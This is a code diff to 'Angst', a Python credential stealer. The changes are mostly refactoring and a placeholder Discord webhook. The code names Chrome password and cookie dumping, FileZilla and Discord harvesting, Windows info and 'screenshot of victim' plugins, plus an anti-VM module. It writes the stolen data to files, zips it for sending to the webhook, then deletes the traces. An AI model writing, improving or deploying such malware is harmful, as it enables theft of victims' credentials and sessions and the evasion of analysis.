@@ -8,17 +8,19 @@ DEPENDENCIES:
     - pywin32
 """
 import os
-import mss.tools
-import requests
 import zipfile
 
+import mss.tools
+import requests
+
+from plugins.antivm import AntiVM
 from plugins.chrome import Chrome
 from plugins.chromecookies import Cookies
-from plugins.screenshot import Screenshot
-from plugins.filezilla import Filezilla
 from plugins.discord import Discord
+from plugins.filezilla import Filezilla
+from plugins.screenshot import Screenshot
 from plugins.windows import Windows
-from plugins.antivm import AntiVM
+
 """
 webhook - The discord webhook for sending logs
 chrome - Should it dump chrome credentials
@@ -28,7 +30,7 @@ screenshot - Take screenshot of victim
 windows - give windows info
 """
 CONFIG = {
-    "webhook" : "",
+    "webhook" : "DISCORD WEBHOOK HERE",
     "software": {
         "chrome" : True,
         "chromecookies": True,
@@ -71,16 +73,16 @@ class Angst():
                             dump_data = self.plugins[conf].dump()
                             if dump_data != "":
                                 dump_file = f"{angst_dir}\\passwords\\{conf}.txt"
-                                with open(dump_file, "w+") as df:
-                                    df.write(dump_data)
+                                with open(dump_file, "w+") as dumped_file:
+                                    dumped_file.write(dump_data)
                         elif conf == "chromecookies":
                             dump_file = f"{angst_dir}\\cookies\\{conf}.txt"
-                            with open(dump_file, "w+") as df:
-                                df.write(self.plugins[conf].dump())
+                            with open(dump_file, "w+") as dumped_file:
+                                dumped_file.write(self.plugins[conf].dump())
                         elif conf == "windows":
                             dump_file = f"{angst_dir}\\{conf}.txt"
-                            with open(dump_file, "w+") as df:
-                                df.write(self.plugins[conf].dump())
+                            with open(dump_file, "w+") as dumped_file:
+                                dumped_file.write(self.plugins[conf].dump())
                         else:
                             mss.tools.to_png(self.plugins[conf].dump().rgb,
                                              self.plugins[conf].dump().size,
@@ -91,14 +93,18 @@ class Angst():
 
 
     def zip(self, src, dst):
-        zf = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
+        """
+        Zips our folder with all the contents
+        preserves part of the folder tree.
+        """
+        zipped_file = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
         abs_src = os.path.abspath(src)
-        for dirname, subdirs, files in os.walk(src):
+        for dirname, _, files in os.walk(src):
             for filename in files:
                 absname = os.path.abspath(os.path.join(dirname, filename))
                 arcname = absname[len(abs_src) + 1:]
-                zf.write(absname, arcname)
-        zf.close()
+                zipped_file.write(absname, arcname)
+        zipped_file.close()
 
     def send(self):
         """
@@ -140,8 +146,8 @@ class Angst():
                 os.remove(filepath)
 
         for subdir, dirs, files in os.walk(angst_dir):
-            for d in dirs:
-                os.rmdir(f"{subdir}\\{d}")
+            for directory in dirs:
+                os.rmdir(f"{subdir}\\{directory}")
         os.rmdir(angst_dir)
         os.remove(os.path.join(self.app_data, f'Angst-[{os.getlogin()}].zip'))
 
